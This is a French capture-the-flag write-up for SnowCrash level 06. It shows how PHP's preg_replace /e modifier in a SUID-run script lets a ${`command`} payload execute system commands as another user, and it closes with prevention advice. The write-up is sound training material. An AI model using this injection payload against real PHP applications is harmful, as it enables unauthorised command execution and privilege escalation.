## SnowCrash - Level 06 - Exploitation du modificateur `/e` de PHP

### 1. Analyse des fichiers

Dans le répertoire de l'utilisateur, on trouve deux fichiers :

* `level06` : Un binaire avec le bit **SUID** (propriétaire `flag06`).
* `level06.php` : Un script PHP utilisé par le binaire.

### 2. La vulnérabilité

Le script PHP contient une faille critique dans l'utilisation de la fonction `preg_replace` :

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);

```

* **Le Regex :** Il recherche des motifs de type `[x contenu]`.
* **Le flag `/e` (Eval) :** C'est une fonctionnalité (obsolète depuis PHP 5.5.0 et supprimée en PHP 7.0.0) qui permet d'exécuter le résultat du remplacement comme du code PHP.
* **L'injection :** Tout ce qui est capturé par `(.*)` (le groupe `\\2`) est injecté dans la chaîne `y("\\2")` qui est ensuite **évaluée** par l'interpréteur PHP.

### 3. Stratégie d'exploitation

Pour exploiter cette faille, il faut injecter une syntaxe que PHP interprétera comme une commande à exécuter lors de l'évaluation de la chaîne.

L'utilisation de la syntaxe **Complex Variable** `${}` combinée avec des **backticks** (```) permet d'exécuter des commandes système :

* `[x ${`commande`}]`

Lorsqu'il traite ce texte, PHP :

1. Identifie le motif via la regex.
2. Tente d'évaluer la chaîne de remplacement : `y("${`getflag`}")`.
3. Pour résoudre la variable `${...}`, il exécute d'abord la commande entre backticks : `getflag`.
4. Affiche le résultat de la commande dans la foulée.

### 4. Mise en œuvre

1. **Création du fichier d'attaque :**
```bash
echo '[x ${`getflag`}]' > /tmp/exploit

```


2. **Exécution via le binaire SUID :**
Le binaire `level06` appelle le script PHP avec les privilèges de `flag06`.
```bash
./level06 /tmp/exploit

```



**Résultat :**

```text
PHP Notice: Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub...

```

### 5. Conclusion et Sécurité

Cette faille est un rappel historique de la dangerosité des fonctions qui évaluent dynamiquement du code (comme `eval()` ou le flag `/e` de `preg_replace`).

**Mesures de prévention :**

* **Mise à jour :** Utiliser des versions modernes de PHP où le flag `/e` n'existe plus.
* **Alternative sécurisée :** Utiliser `preg_replace_callback` à la place de `/e`. Cela permet d'exécuter une fonction sur les captures sans passer par une évaluation de chaîne de caractères.
